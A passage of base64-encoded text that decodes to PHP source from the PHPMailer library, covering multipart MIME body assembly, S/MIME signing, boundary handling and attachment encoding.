CAnJywgJ3RleHQvY2FsZW5kYXI7IG1ldGhvZD1SRVFVRVNUJywgJycpOw0KICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5JY2FsLCAkdGhpcy0+RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvcmVsYXRlZDsnKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzJdIC4gJyInKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGJvZHlDaGFyU2V0LCAndGV4dC9odG1sJywgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2lubGluZScsICR0aGlzLT5ib3VuZGFyeVsyXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnYWx0X2F0dGFjaCc6DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L2FsdGVybmF0aXZlOycpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYWx0Qm9keUNoYXJTZXQsICd0ZXh0L3BsYWluJywgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L2FsdGVybmF0aXZlOycpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYWx0Qm9keUNoYXJTZXQsICd0ZXh0L3BsYWluJywgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzJdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbM10gLiAnIicpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzNdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzNdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2F0dGFjaG1lbnQnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAkdGhpcy0+RW5jb2RpbmcgPSAkYm9keUVuY29kaW5nOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICR0aGlzLT5FbmNvZGluZyk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR0aGlzLT5pc0Vycm9yKCkpIHsNCiAgICAgICAgICAgICRib2R5ID0gJyc7DQogICAgICAgIH0gZWxzZWlmICgkdGhpcy0+c2lnbl9rZXlfZmlsZSkgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICBpZiAoIWRlZmluZWQoJ1BLQ1M3X1RFWFQnKSkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleHRlbnNpb25fbWlzc2luZycpIC4gJ29wZW5zc2wnKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGZpbGUgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgJ21haWwnKTsNCiAgICAgICAgICAgICAgICBpZiAoZmFsc2UgPT09IEBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJGJvZHkpKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3NpZ25pbmcnKSAuICcgQ291bGQgbm90IHdyaXRlIHRlbXAgZmlsZScpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkc2lnbmVkID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICdzaWduZWQnKTsNCiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPnNpZ25fZXh0cmFjZXJ0c19maWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAkc2lnbiA9IEBvcGVuc3NsX3BrY3M3X3NpZ24oJGZpbGUsICRzaWduZWQsICdmaWxlOi8vJyAuIHJlYWxwYXRoKCR0aGlzLT5zaWduX2NlcnRfZmlsZSksIGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpLA0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNpZ25fa2V5X3Bhc3MNCiAgICAgICAgICAgICAgICAgICAgKSwgbnVsbCk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJHNpZ24gPSBAb3BlbnNzbF9wa2NzN19zaWduKCRmaWxlLCAkc2lnbmVkLCAnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9jZXJ0X2ZpbGUpLCBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICdmaWxlOi8vJyAuIHJlYWxwYXRoKCR0aGlzLT5zaWduX2tleV9maWxlKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5zaWduX2tleV9wYXNzDQogICAgICAgICAgICAgICAgICAgICksIG51bGwsIFBLQ1M3X0RFVEFDSEVELCAkdGhpcy0+c2lnbl9leHRyYWNlcnRzX2ZpbGUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoJHNpZ24pIHsNCiAgICAgICAgICAgICAgICAgICAgQHVubGluaygkZmlsZSk7DQogICAgICAgICAgICAgICAgICAgICRib2R5ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRzaWduZWQpOw0KICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRzaWduZWQpOw0KICAgICAgICAgICAgICAgICAgICAkcGFydHMgPSBleHBsb2RlKCJcblxuIiwgJGJvZHksIDIpOw0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciAuPSAkcGFydHNbMF0gLiAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgICAgICRib2R5ID0gJHBhcnRzWzFdOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJGZpbGUpOw0KICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRzaWduZWQpOw0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdzaWduaW5nJykgLiBvcGVuc3NsX2Vycm9yX3N0cmluZygpKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsNCiAgICAgICAgICAgICAgICAkYm9keSA9ICcnOw0KICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJGJvZHk7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZXRCb3VuZGFyeSgkYm91bmRhcnksICRjaGFyU2V0LCAkY29udGVudFR5cGUsICRlbmNvZGluZykgew0KICAgICAgICAkcmVzdWx0ID0gJyc7DQogICAgICAgIGlmICgkY2hhclNldCA9PSAnJykgew0KICAgICAgICAgICAgJGNoYXJTZXQgPSAkdGhpcy0+Q2hhclNldDsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGNvbnRlbnRUeXBlID09ICcnKSB7DQogICAgICAgICAgICAkY29udGVudFR5cGUgPSAkdGhpcy0+Q29udGVudFR5cGU7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRlbmNvZGluZyA9PSAnJykgew0KICAgICAgICAgICAgJGVuY29kaW5nID0gJHRoaXMtPkVuY29kaW5nOw0KICAgICAgICB9DQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkYm91bmRhcnkpOw0KICAgICAgICAkcmVzdWx0IC49IHNwcmludGYoJ0NvbnRlbnQtVHlwZTogJXM7IGNoYXJzZXQ9JXMnLCAkY29udGVudFR5cGUsICRjaGFyU2V0KTsNCiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+TEU7DQogICAgICAgIGlmICgkZW5jb2RpbmcgIT0gJzdiaXQnKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nJywgJGVuY29kaW5nKTsNCiAgICAgICAgfQ0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5MRTsNCiAgICAgICAgcmV0dXJuICRyZXN1bHQ7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBlbmRCb3VuZGFyeSgkYm91bmRhcnkpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5MRSAuICctLScgLiAkYm91bmRhcnkgLiAnLS0nIC4gJHRoaXMtPkxFOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0TWVzc2FnZVR5cGUoKSB7DQogICAgICAgICR0eXBlID0gYXJyYXkoKTsNCiAgICAgICAgaWYgKCR0aGlzLT5hbHRlcm5hdGl2ZUV4aXN0cygpKSB7DQogICAgICAgICAgICAkdHlwZVtdID0gJ2FsdCc7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR0aGlzLT5pbmxpbmVJbWFnZUV4aXN0cygpKSB7DQogICAgICAgICAgICAkdHlwZVtdID0gJ2lubGluZSc7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR0aGlzLT5hdHRhY2htZW50RXhpc3RzKCkpIHsNCiAgICAgICAgICAgICR0eXBlW10gPSAnYXR0YWNoJzsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+bWVzc2FnZV90eXBlID0gaW1wbG9kZSgnXycsICR0eXBlKTsNCiAgICAgICAgaWYgKCR0aGlzLT5tZXNzYWdlX3R5cGUgPT0gJycpIHsNCiAgICAgICAgICAgICR0aGlzLT5tZXNzYWdlX3R5cGUgPSAncGxhaW4nOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBoZWFkZXJMaW5lKCRuYW1lLCAkdmFsdWUpIHsNCiAgICAgICAgcmV0dXJuICRuYW1lIC4gJzogJyAuICR2YWx1ZSAuICR0aGlzLT5MRTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHRleHRMaW5lKCR2YWx1ZSkgew0KICAgICAgICByZXR1cm4gJHZhbHVlIC4gJHRoaXMtPkxFOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQXR0YWNobWVudCgkcGF0aCwgJG5hbWUgPSAnJywgJGVuY29kaW5nID0gJ2Jhc2U2NCcsICR0eXBlID0gJycsICRkaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50Jykgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKCFAaXNfZmlsZSgkcGF0aCkpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdmaWxlX2FjY2VzcycpIC4gJHBhdGgsIHNlbGY6OlNUT1BfQ09OVElOVUUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCR0eXBlID09ICcnKSB7DQogICAgICAgICAgICAgICAgJHR5cGUgPSBzZWxmOjpmaWxlbmFtZVRvVHlwZSgkcGF0aCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkcGF0aCk7DQogICAgICAgICAgICBpZiAoJG5hbWUgPT0gJycpIHsNCiAgICAgICAgICAgICAgICAkbmFtZSA9ICRmaWxlbmFtZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAwID0+ICRwYXRoLA0KICAgICAgICAgICAgICAgIDEgPT4gJGZpbGVuYW1lLA0KICAgICAgICAgICAgICAgIDIgPT4gJG5hbWUsDQogICAgICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsDQogICAgICAgICAgICAgICAgNCA9PiAkdHlwZSwNCiAgICAgICAgICAgICAgICA1ID0+IGZhbHNlLA0KICAgICAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLA0KICAgICAgICAgICAgICAgIDcgPT4gMA0KICAgICAgICAgICAgKTsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldEF0dGFjaG1lbnRzKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmF0dGFjaG1lbnQ7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhdHRhY2hBbGwoJGRpc3Bvc2l0aW9uX3R5cGUsICRib3VuZGFyeSkgew0KICAgICAgICAkbWltZSAgICA9IGFycmF5KCk7DQogICAgICAgICRjaWRVbmlxID0gYXJyYXkoKTsNCiAgICAgICAgJGluY2wgICAgPSBhcnJheSgpOw0KICAgICAgICBmb3JlYWNoICgkdGhpcy0+YXR0YWNobWVudCBhcyAkYXR0YWNobWVudCkgew0KICAgICAgICAgICAgaWYgKCRhdHRhY2htZW50WzZdID09ICRkaXNwb3NpdGlvbl90eXBlKSB7DQogICAgICAgICAgICAgICAgJHN0cmluZyAgPSAnJzsNCiAgICAgICAgICAgICAgICAkcGF0aCAgICA9ICcnOw0KICAgICAgICAgICAgICAgICRiU3RyaW5nID0gJGF0dGFjaG1lbnRbNV07DQogICAgICAgICAgICAgICAgaWYgKCRiU3RyaW5nKSB7DQogICAgICAgICAgICAgICAgICAgICRzdHJpbmcgPSAkYXR0YWNobWVudFswXTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkcGF0aCA9ICRhdHRhY2htZW50WzBdOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkaW5jbGhhc2ggPSBtZDUoc2VyaWFsaXplKCRhdHRhY2htZW50KSk7DQogICAgICAgICAgICAgICAgaWYgKGluX2FycmF5KCRpbmNsaGFzaCwgJGluY2wpKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkaW5jbFtdICAgICAgPSAkaW5jbGhhc2g7DQogICAgICAgICAgICAgICAgJG5hbWUgICAgICAgID0gJGF0dGFjaG1lbnRbMl07DQogICAgICAgICAgICAgICAgJGVuY29kaW5nICAgID0gJGF0dGFjaG1lbnRbM107DQogICAgICAgICAgICAgICAgJHR5cGUgICAgICAgID0gJGF0dGFjaG1lbnRbNF07DQogICAgICAgICAgICAgICAgJGRpc3Bvc2l0aW9uID0gJGF0dGFjaG1lbnRbNl07DQogICAgICAgICAgICAgICAgJGNpZCAgICAgICAgID0gJGF0dGFjaG1lbnRbN107DQogICAgICAgICAgICAgICAgaWYgKCRkaXNwb3NpdGlvbiA9PSAnaW5saW5lJyAmJiBhcnJheV9rZXlfZXhpc3RzKCRjaWQsICRjaWRVbmlxKSkgew0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGNpZFVuaXFbJGNpZF0gPSB0cnVlOw0KICAgICAgICAgICAgICAgICRtaW1lW10gICAgICAgID0gc3ByaW50ZignLS0lcyVzJywgJGJvdW5kYXJ5LCAkdGhpcy0+TEUpOw0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJG5hbWUpKSB7DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LVR5cGU6ICVzOyBuYW1lPSIlcyIlcycsICR0eXBlLCAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJG5hbWUpKSwgJHRoaXMtPkxFKTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1UeXBlOiAlcyVzJywgJHR5cGUsICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICgkZW5jb2RpbmcgIT0gJzdiaXQnKSB7DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiAlcyVzJywgJGVuY29kaW5nLCAkdGhpcy0+TEUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoJGRpc3Bvc2l0aW9uID09ICdpbmxpbmUnKSB7DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LUlEOiA8JXM+JXMnLCAkY2lkLCAkdGhpcy0+TEUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoIShlbXB0eSgkZGlzcG9zaXRpb24pKSkgew0KICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZF9uYW1lID0gJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRuYW1lKSk7DQogICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvWyBcKFwpPD5ALDs6XFwiXC9cW1xdXD89XS8nLCAkZW5jb2RlZF9uYW1lKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJ0NvbnRlbnQtRGlzcG9zaXRpb246ICVzOyBmaWxlbmFtZT0iJXMiJXMnLCAkZGlzcG9zaXRpb24sICRlbmNvZGVkX25hbWUsICR0aGlzLT5MRSAuICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRlbmNvZGVkX25hbWUpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJ0NvbnRlbnQtRGlzcG9zaXRpb246ICVzOyBmaWxlbmFtZT0lcyVzJywgJGRpc3Bvc2l0aW9uLCAkZW5jb2RlZF9uYW1lLCAkdGhpcy0+TEUgLiAkdGhpcy0+TEUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1EaXNwb3NpdGlvbjogJXMlcycsICRkaXNwb3NpdGlvbiwgJHRoaXMtPkxFIC4gJHRoaXMtPkxFKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICgkYlN0cmluZykgew0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPmVuY29kZVN0cmluZygkc3RyaW5nLCAkZW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICcnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5lbmNvZGVGaWxlKCRwYXRoLCAkZW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICcnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCctLSVzLS0lcycsICRib3VuZGFyeSwgJHRoaXMtPkxFKTsNCiAgICAgICAgcmV0dXJuIGltcGxvZGUoJycsICRtaW1lKTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVuY29kZUZpbGUoJHBhdGgsICRlbmNvZGluZyA9ICdiYXNlNjQnKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoIWlzX3JlYWRhYmxlKCRwYXRoKSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2ZpbGVfb3BlbicpIC4gJHBhdGgsIHNlbGY6OlNUT1BfQ09OVElOVUUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJG1hZ2ljX3F1b3RlcyA9IGdldF9tYWdpY19xdW90ZXNfcnVudGltZSgpOw0KICAgICAgICAgICAgaWYgKCRtYWdpY19xdW90ZXMpIHsNCiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4zLjAnLCAnPCcpKSB7DQogICAgICAgICAgICAgICAgICAgIHNldF9tYWdpY19xdW90ZXNfcnVudGltZShmYWxzZSk7DQogICAgICAgICAgICAgIC